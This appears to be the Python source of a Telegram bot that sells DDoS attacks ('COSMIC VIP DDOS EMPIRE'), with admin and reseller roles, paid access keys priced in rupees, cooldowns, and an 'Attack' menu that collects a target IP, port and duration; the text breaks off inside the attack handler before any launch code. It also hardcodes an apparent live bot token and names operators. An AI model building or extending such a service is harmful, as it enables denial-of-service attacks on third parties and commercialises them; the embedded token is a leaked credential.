import os
import json
import time
import random
import string
import telebot
import datetime
import re
import subprocess
import threading
import signal
import logging
from telebot import types
from dateutil.relativedelta import relativedelta

# Setup logging for nohup
logging.basicConfig(
    filename='bot.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Telegram bot
try:
    bot = telebot.TeleBot('8147615549:AAGwT0ppniPc4UqlgtB-akzN9t0B4djMTAY')
    logging.info("Bot initialized successfully")
except Exception as e:
    logging.error(f"Bot initialization failed: {e}")
    exit(1)

# Permanent admin user IDs (untouchable)
PERMANENT_ADMINS = {
    "1807014348": {"username": "@sadiq9869", "nickname": "Cosmic Emperor"},
    "6258297180": {"username": "@Rahul_618", "nickname": "Galactic Overlord"}
}

# Dynamic admin user IDs (can be added/removed)
dynamic_admins = {
    "6955279265": {"username": "@DDOS_VVIP"},
    "1866961136": {"username": "@Rohan2349", "nickname": "Rohan Guru"}
}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
ADMINS_FILE = "admins.json"

# Per key cost (in Rs per unit duration)
KEY_COST_PER_HOUR = 10
KEY_COST_PER_DAY = 100
KEY_COST_PER_MONTH = 900

# In-memory storage
users = {}
keys = {}
last_attack_time = {}
resellers = {}

# Load data from files
def load_data():
    global users, keys, resellers, dynamic_admins
    users = read_json(USER_FILE, {})
    keys = read_json(KEY_FILE, {})
    resellers = read_json(RESELLERS_FILE, {})
    dynamic_admins = read_json(ADMINS_FILE, {})
    logging.info("Data loaded successfully")

def read_json(file_path, default):
    try:
        with open(file_path, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"Error reading {file_path}: {e}")
        return default

def save_json(file_path, data):
    try:
        with open(file_path, "w") as file:
            json.dump(data, file, indent=4)
        logging.info(f"Saved data to {file_path}")
    except Exception as e:
        logging.error(f"Error saving {file_path}: {e}")

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"ARMY-PK-{random_key.upper()}"

def add_time_to_current_date(hours=0, days=0, months=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(months=months, days=days, hours=hours)
    return new_time

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username or f"UserID: {user_id}"
    log_entry = (
        f"🌌 Time: {datetime.datetime.now()}\n"
        f"👤 Username: {username}\n"
        f"🎯 Target: {target}\n"
        f"🔌 Port: {port}\n"
        f"⏳ Time: {time}\n\n"
    )
    try:
        with open(LOG_FILE, "a") as file:
            file.write(log_entry)
        logging.info(f"Logged command for user {user_id}")
    except Exception as e:
        logging.error(f"Error writing to log: {e}")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"🆔 UserID: {user_id} | 🌌 Time: {datetime.datetime.now()} | 📜 Command: {command}"
    if target:
        log_entry += f" | 🎯 Target: {target}"
    if port:
        log_entry += f" | 🔌 Port: {port}"
    if time:
        log_entry += f" | ⏳ Time: {time}"
    try:
        with open(LOG_FILE, "a") as file:
            file.write(log_entry + "\n")
        logging.info(f"Recorded command log for user {user_id}")
    except Exception as e:
        logging.error(f"Error writing to log: {e}")

# Parse duration string (e.g., "2h", "2hours", "2D", "2days", "2M", "2months")
def parse_duration(duration_str):
    duration_str = duration_str.lower()
    match = re.match(r"^(\d+)(h|hour|hours|d|day|days|m|month|months)$", duration_str)
    if not match:
        return None, None
    amount, unit = int(match.group(1)), match.group(2)
    if unit in ("h", "hour", "hours"):
        return amount, "hours"
    elif unit in ("d", "day", "days"):
        return amount, "days"
    elif unit in ("m", "month", "months"):
        return amount, "months"
    return None, None

# Calculate cost based on duration
def calculate_key_cost(amount, unit):
    if unit == "hours":
        return amount * KEY_COST_PER_HOUR
    elif unit == "days":
        return amount * KEY_COST_PER_DAY
    elif unit == "months":
        return amount * KEY_COST_PER_MONTH
    return 0

# Check if user is admin (permanent or dynamic)
def is_admin(user_id):
    return user_id in PERMANENT_ADMINS or user_id in dynamic_admins

# Check if message is in DM
def is_dm(message):
    return message.chat.type == "private"

# Create inline keyboard for main menu
def create_main_menu(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Attack", callback_data="attack"),
        types.InlineKeyboardButton("👤 My Info", callback_data="my_info"),
        types.InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem_key")
    )
    if is_admin(user_id) or user_id in resellers:
        markup.add(
            types.InlineKeyboardButton("🔑 Generate Key", callback_data="gen_key"),
            types.InlineKeyboardButton("🔍 View All Keys", callback_data="all_keys")
        )
    if is_admin(user_id):
        markup.add(
            types.InlineKeyboardButton("🚫 Block Key", callback_data="block_key"),
            types.InlineKeyboardButton("📜 Logs", callback_data="logs")
        )
    if user_id in PERMANENT_ADMINS:
        markup.add(
            types.InlineKeyboardButton("👑 Add Admin", callback_data="add_admin"),
            types.InlineKeyboardButton("🗑 Remove Admin", callback_data="remove_admin")
        )
    return markup

# Create back button for sub-menus
def create_back_button(callback_data="back_to_main"):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data=callback_data))
    return markup

# Generic handler for non-DM usage
def handle_non_dm(message):
    if not is_dm(message):
        chat_username = message.chat.username or "Unknown"
        bot.send_message(
            message.chat.id,
            (
                "⛔ *Cosmic Alert* ⛔\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⚠ Thare group/channel (@{chat_username}) mein problem hai aa raha ha!\n"
                "📩 try bot ka DM mein use kar ka dekho, @Ddos_sadiq_bot pe chalo!\n"
                "━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            parse_mode='Markdown'
        )
        logging.warning(f"Non-DM usage attempt by user {message.chat.id} in @{chat_username}")
        return True
    return False

# Command to add an admin (Permanent admins only)
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if user_id not in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) admins add kar sakte hain, jaanu! 😎"
        ), parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/addadmin <user_id>`\n"
            "Example: `/addadmin 123456789`\n"
            "Chal, sahi ID daal, hero! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    new_admin_id = command[1]
    if new_admin_id in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⚠ *Error* ⚠\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Permanent admins add nahi ho sakte, bhai! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if new_admin_id in dynamic_admins:
        bot.send_message(message.chat.id, (
            f"⚠ *Error* ⚠\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 User {new_admin_id} already ek admin hai, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    try:
        user_info = bot.get_chat(new_admin_id)
        username = user_info.username or user_info.first_name
        dynamic_admins[new_admin_id] = {"username": f"@{username}"}
        save_json(ADMINS_FILE, dynamic_admins)
        bot.send_message(message.chat.id, (
            f"✅ *Naya Admin Add Ho Gaya!* ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 *User ID*: {new_admin_id}\n"
            f"📛 *Username*: @{username}\n"
            f"🌌 *Role*: Cosmic Admin\n"
            f"Ab yeh bhi cosmos rule karega! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Admin {new_admin_id} added by {user_id}")
    except Exception as e:
        bot.send_message(message.chat.id, (
            f"❌ *Error* ❌\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 Invalid user ID ya error: {str(e)}! Thoda check kar, bhai! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.error(f"Error adding admin {new_admin_id}: {e}")

# Command to remove an admin (Permanent admins only)
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if user_id not in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) admins hata sakte hain, jaanu! 😎"
        ), parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/removeadmin <user_id>`\n"
            "Example: `/removeadmin 123456789`\n"
            "Chal, ID daal, hero! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    target_admin_id = command[1]
    if target_admin_id in PERMANENT_ADMINS:
        bot.send_message(message.chat.id, (
            "⛔ *Error* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Cosmic Emperor (@sadiq9869) ya Galactic Overlord (@Rahul_618) ko hata nahi sakte, bhai! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if target_admin_id not in dynamic_admins:
        bot.send_message(message.chat.id, (
            f"⚠ *Error* ⚠\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 User {target_admin_id} admin nahi hai, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    del dynamic_admins[target_admin_id]
    save_json(ADMINS_FILE, dynamic_admins)
    bot.send_message(message.chat.id, (
        f"✅ *Admin Hata Diya!* ✅\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 *User ID*: {target_admin_id}\n"
        f"🌌 *Status*: Ab Cosmic Admin nahi! Chal, agla kaam bol! 😎"
    ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Admin {target_admin_id} removed by {user_id}")

# Command to generate keys with custom keyname
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id) and user_id not in resellers:
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins ya resellers keys generate kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    command = message.text.split()
    if len(command) != 3:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/genkey <duration> <keyname>`\n"
            "Example: `/genkey 2hours mykey123`\n"
            "Supported durations: `h/hour/hours`, `d/day/days`, `m/month/months`\n"
            "Chal, details daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    duration, keyname = command[1], command[2]
    amount, unit = parse_duration(duration)
    if not amount or not unit:
        bot.send_message(message.chat.id, (
            "❌ *Invalid Duration* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Valid formats: `2h`, `2hours`, `3d`, `3days`, `1m`, `1month`! Thoda dhyan se, bhai! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if not re.match(r"^[a-zA-Z0-9_-]{3,20}$", keyname):
        bot.send_message(message.chat.id, (
            "❌ *Invalid Keyname* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 3-20 characters (letters, numbers, _, - only)! Arre, sahi naam daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    for key, details in keys.items():
        if details.get("keyname") == keyname:
            if details.get("expiration_time"):
                expiration = datetime.datetime.strptime(details["expiration_time"], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < expiration:
                    bot.send_message(message.chat.id, (
                        f"❌ *Keyname Taken* ❌\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌌 Keyname '{keyname}' already active hai! Dusra naam try kar, jaanu! 😜"
                    ), parse_mode='Markdown', reply_markup=create_back_button())
                    return
                else:
                    keys[key]["duration"] = duration
                    keys[key]["amount"] = amount
                    keys[key]["unit"] = unit
                    keys[key]["expiration_time"] = None
                    keys[key]["keyname"] = keyname
                    save_json(KEY_FILE, keys)
                    cost = calculate_key_cost(amount, unit)
                    if is_admin(user_id):
                        response = (
                            f"🌟 *Jaanu, Key Update Ho Gaya!* 🌟\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"🔑 *Key*: `{key}`\n"
                            f"📛 *Keyname*: {keyname}\n"
                            f"⏳ *Duration*: {duration}\n"
                            f"📅 *Status*: Redeem ke liye ready! Chal, try kar! 😎"
                        )
                    elif user_id in resellers:
                        if resellers[user_id] >= cost:
                            resellers[user_id] -= cost
                            save_json(RESELLERS_FILE, resellers)
                            response = (
                                f"🌟 *Jaanu, Key Update Ho Gaya!* 🌟\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"🔑 *Key*: `{key}`\n"
                                f"📛 *Keyname*: {keyname}\n"
                                f"⏳ *Duration*: {duration}\n"
                                f"💸 *Cost*: {cost} Rs\n"
                                f"💰 *Remaining Balance*: {resellers[user_id]} Rs\n"
                                f"📅 *Status*: Redeem ke liye ready! Chal, try kar! 😎"
                            )
                        else:
                            response = (
                                f"❌ *Balance Kam Hai* ❌\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"💸 *Required*: {cost} Rs\n"
                                f"💰 *Available*: {resellers[user_id]} Rs\n"
                                f"Arre, balance bada, hero! 😜"
                            )
                    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
                    logging.info(f"Key {key} updated by {user_id}")
                    return
    key = create_random_key()
    keys[key] = {"duration": duration, "amount": amount, "unit": unit, "expiration_time": None, "keyname": keyname}
    save_json(KEY_FILE, keys)
    cost = calculate_key_cost(amount, unit)
    if is_admin(user_id):
        response = (
            f"🌟 *Jaanu, Key Generate Ho Gaya!* 🌟\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 *Key*: `{key}`\n"
            f"📛 *Keyname*: {keyname}\n"
            f"⏳ *Duration*: {duration}\n"
            f"📅 *Status*: Redeem ke liye ready! Chal, DM mein try kar! 😜"
        )
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_json(RESELLERS_FILE, resellers)
            response = (
                f"🌟 *Jaanu, Key Generate Ho Gaya!* 🌟\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔑 *Key*: `{key}`\n"
                f"📛 *Keyname*: {keyname}\n"
                f"⏳ *Duration*: {duration}\n"
                f"💸 *Cost*: {cost} Rs\n"
                f"💰 *Remaining Balance*: {resellers[user_id]} Rs\n"
                f"📅 *Status*: Redeem ke liye ready! Chal, DM mein try kar! 😜"
            )
        else:
            response = (
                f"❌ *Balance Kam Hai* ❌\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💸 *Required*: {cost} Rs\n"
                f"💰 *Available*: {resellers[user_id]} Rs\n"
                f"Arre, balance bada, hero! 😜"
            )
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Key {key} generated by {user_id}")

# Command to block/expire a key (Admin only)
@bot.message_handler(commands=['block'])
def block_key(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins keys block kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    command = message.text.split()
    if len(command) != 3 or command[1].lower() != "key":
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/block key <keyname>`\n"
            "Example: `/block key mykey123`\n"
            "Chal, sahi keyname daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    keyname = command[2]
    found = False
    for key, details in keys.items():
        if details.get("keyname") == keyname:
            if details.get("expiration_time"):
                expiration = datetime.datetime.strptime(details["expiration_time"], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < expiration:
                    details["expiration_time"] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    save_json(KEY_FILE, keys)
                    bot.send_message(message.chat.id, (
                        f"✅ *Key Block Ho Gaya!* ✅\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📛 *Keyname*: {keyname}\n"
                        f"🔑 *Key*: `{key}`\n"
                        f"📅 *Status*: Expired! Chal, agla kaam bol! 😎"
                    ), parse_mode='Markdown', reply_markup=create_back_button())
                    logging.info(f"Key {key} blocked by {user_id}")
                else:
                    bot.send_message(message.chat.id, (
                        f"⚠ *Pehle Se Expired* ⚠\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌌 Keyname '{keyname}' pehle se expired hai, jaanu! 😜"
                    ), parse_mode='Markdown', reply_markup=create_back_button())
            else:
                bot.send_message(message.chat.id, (
                    f"⚠ *Not Redeemed* ⚠\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌌 Keyname '{keyname}' abhi redeem nahi hua, hero! 😎"
                ), parse_mode='Markdown', reply_markup=create_back_button())
            found = True
            break
    if not found:
        bot.send_message(message.chat.id, (
            f"❌ *Key Nahi Mili* ❌\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 Keyname '{keyname}' exist nahi karta, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Block key attempt for {name} by {user_id}")

# Command to view all keys
@bot.message_handler(commands=['allkeys'])
def list_all_keys(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id) and user_id not in resellers:
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins ya resellers keys dekh sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if not keys:
        bot.send_message(message.chat.id, (
            "⚠ *Koi Keys Nahi* ⚠\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Koi keys nahi mili, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    response = "🔑 *Sab Cosmic Keys* 🔑\n━━━━━━━━━━━━━━━━━━━━━━━\n"
    for key, details in keys.items():
        status = "Not redeemed" if not details.get("expiration_time") else details["expiration_time"]
        if details.get("expiration_time"):
            expiration = datetime.datetime.strptime(details["expiration_time"], '%Y-%m-%d %H:%M:%S')
            status = "Expired" if datetime.datetime.now() > expiration else details["expiration_time"]
        response += (
            f"🔑 *Key*: `{key}`\n"
            f"📛 *Keyname*: {details.get('keyname', 'N/A')}\n"
            f"⏳ *Duration*: {details['duration']}\n"
            f"📅 *Status*: {status}\n\n"
        )
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"All keys viewed by {user_id}")

# Admin command to add a reseller
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins resellers add kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    command = message.text.split()
    if len(command) != 3:
        bot.send_message(message.chat.id, (
            "📜 *Usage*: `/add_reseller <user_id> <balance>`\n"
            "Example: `/add_reseller 123456789 1000`\n"
            "Chal, details daal, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    reseller_id, balance = command[1], command[2]
    try:
        balance = int(balance)
        if balance < 0:
            raise ValueError("Balance cannot be negative")
        resellers[reseller_id] = balance
        save_json(RESELLERS_FILE, resellers)
        bot.send_message(message.chat.id, (
            f"✅ *Naya Reseller Add Ho Gaya!* ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 *Reseller ID*: {reseller_id}\n"
            f"💰 *Balance*: {balance} Rs\n"
            f"Ab yeh bhi keys bechega! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"Reseller {reseller_id} added by {user_id}")
    except ValueError:
        bot.send_message(message.chat.id, (
            "❌ *Invalid Balance* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Balance ek valid number hona chahiye, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.error(f"Invalid balance for reseller {reseller_id} by {user_id}")

# Admin command to display help
@bot.message_handler(commands=['help'])
def help_command(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins help command use kar sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    help_text = """
🌌 *COSMIC OMNIPOTENT PANEL* 🌌
━━━━━━━━━━━━━━━━━━━━━━━
⚡️ *ADMIN PRIVILEGES* ⚡️
✅ Unlimited access to sab commands
✅ No cooldowns ya balance checks

🛠 *BOT CONTROLS*:
🚀 `/start` - Cosmic interface launch karo
📖 `/help` - Yeh epic guide dekho

⚙ *MANAGEMENT*:
👑 `/addadmin <

user_id>` - Naya admin add karo (Sirf Permanent Admins)
🗑 `/removeadmin <user_id>` - Admin hatao (Sirf Permanent Admins)
🏦 `/add_reseller <user_id> <balance>` - Reseller add karo
🔑 `/genkey <duration> <keyname>` - Key generate karo (e.g., `2hours mykey123`)
🚫 `/block key <keyname>` - Key expire/block karo
🔍 `/allkeys` - Sab keys dekho
📜 `/logs` - Cosmic logs dekho
👥 `/users` - Authorized users dekho
❌ `/remove <user_id>` - User hatao
🎖 `/resellers` - Resellers dekho
💰 `/addbalance <reseller_id> <amount>` - Reseller ko balance add karo
🗑 `/remove_reseller <reseller_id>` - Reseller hatao

💥 *ATTACK CONTROLS*:
🚀 `🚀 Attack` - Cosmic strike launch karo
👤 `👤 My Info` - Apne stats dekho
🎟 `🎟️ Redeem Key` - Key redeem karo

📋 *EXAMPLE COMMANDS*:
`/genkey 2hours mykey123` - 2-hour key banaye
`/block key mykey123` - Key block karo
`/addadmin 123456789` - Admin add karo
━━━━━━━━━━━━━━━━━━━━━━━
👑 *Cosmos ko rule karo, admin!* 💫
"""
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Help command accessed by {user_id}")

# Reseller command to check balance
@bot.message_handler(commands=['balance'])
def check_balance(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if is_admin(user_id):
        response = (
            "💰 *Admin Balance* 💰\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Unlimited balance, jaanu! 😎"
        )
    elif user_id in resellers:
        response = (
            f"💰 *Tera Balance* 💰\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌌 Balance: {resellers[user_id]} Rs\n"
            f"Chal, keys bech, hero! 😜"
        )
    else:
        response = (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf resellers ya admins balance check kar sakte hain, jaanu! 😜"
        )
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Balance checked by {user_id}")

# Handle key redemption prompt
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    if handle_non_dm(message):
        return
    bot.send_message(message.chat.id, (
        "🔑 *Apni Key Bhejo, Jaanu!* 🔑\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🌌 Key enter karo aur cosmic power unlock karo! 😜"
    ), parse_mode='Markdown', reply_markup=create_back_button())
    bot.register_next_step_handler(message, process_redeem_key)
    logging.info(f"Redeem key prompt accessed by {message.chat.id}")

def process_redeem_key(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    key = message.text.strip()
    if is_admin(user_id):
        bot.send_message(message.chat.id, (
            "✅ *Admin Access* ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Tumhe key redeem karne ki zarurat nahi, unlimited access hai, hero! 😎"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if key not in keys:
        bot.send_message(message.chat.id, (
            "❌ *Invalid Key* ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Yeh key invalid ya expired hai, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if user_id in users:
        current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() < current_expiration:
            bot.send_message(message.chat.id, (
                "❕ *Active Access* ❕\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Tumhare paas pehle se active access hai, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            return
        del users[user_id]
    amount, unit = keys[key]["amount"], keys[key]["unit"]
    expiration_time = add_time_to_current_date(**{unit: amount})
    users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
    keys[key]["expiration_time"] = users[user_id]
    save_json(USER_FILE, users)
    save_json(KEY_FILE, keys)
    bot.send_message(message.chat.id, (
        f"✅ *Access Mil Gaya, Jaanu!* ✅\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 *Key*: `{key}`\n"
        f"📛 *Keyname*: {keys[key].get('keyname', 'N/A')}\n"
        f"⏳ *Duration*: {keys[key]['duration']}\n"
        f"📅 *Expires on*: {users[user_id]}\n"
        f"Ab cosmic power unleash kar, hero! 😜"
    ), parse_mode='Markdown', reply_markup=create_back_button())
    logging.info(f"Key {key} redeemed by {user_id}")

# Admin command to show logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.send_message(message.chat.id, (
            "⛔ *Access Denied* ⛔\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Sirf admins logs dekh sakte hain, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file, caption="📜 *Cosmic Logs, Jaanu!*", reply_markup=create_back_button())
            logging.info(f"Logs sent to {user_id}")
        except Exception as e:
            bot.send_message(message.chat.id, (
                f"⚠ *Error* ⚠\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌌 Logs bhejne mein error: {str(e)}! Thoda check kar, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            logging.error(f"Error sending logs to {user_id}: {e}")
    else:
        bot.send_message(message.chat.id, (
            "⚠ *Koi Logs Nahi* ⚠\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Koi logs nahi mili, jaanu! 😜"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        logging.info(f"No logs found for {user_id}")

# Start command to display main menu
@bot.message_handler(commands=['start'])
def start_command(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    username = message.chat.username or "Guest"
    role = "Permanent Admin" if user_id in PERMANENT_ADMINS else "Admin" if user_id in dynamic_admins else "Reseller" if user_id in resellers else "User" if user_id in users else "Guest"
    welcome_text = (
        "🌌 *COSMIC VIP DDOS EMPIRE* 🌌\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *User*: @{username}\n"
        f"🚹 *Role*: {role}\n"
        "💥 Tap karke cosmic power unleash karo, jaanu! 😎\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=create_main_menu(user_id), parse_mode='Markdown')
    logging.info(f"Start command by {user_id}")

COOLDOWN_PERIOD = 60  # 1 minute cooldown for non-admins

# Handle attack command
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    if handle_non_dm(message):
        return
    user_id = str(message.chat.id)
    if is_admin(user_id):
        bot.send_message(message.chat.id, (
            "🎯 *Target Details Bhejo, Jaanu!* 🎯\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🌌 Target IP, port, aur duration (seconds) space se alag karke bhejo:"
        ), parse_mode='Markdown', reply_markup=create_back_button())
        bot.register_next_step_handler(message, process_attack_details)
    elif user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            bot.send_message(message.chat.id, (
                "⏰ *Access Expired* ⏰\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌌 Tumhara access expire ho gaya! @Rahul_618 se contact kar, hero! 😎"
            ), parse_mode='Markdown', reply_markup=create_back_button())
            return
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = int(COOLDOWN_PERIOD - time_since_last_attack)
                bot.send_message(message.chat.id, (
                    f"⌛ *Cooldown Active* ⌛\n"
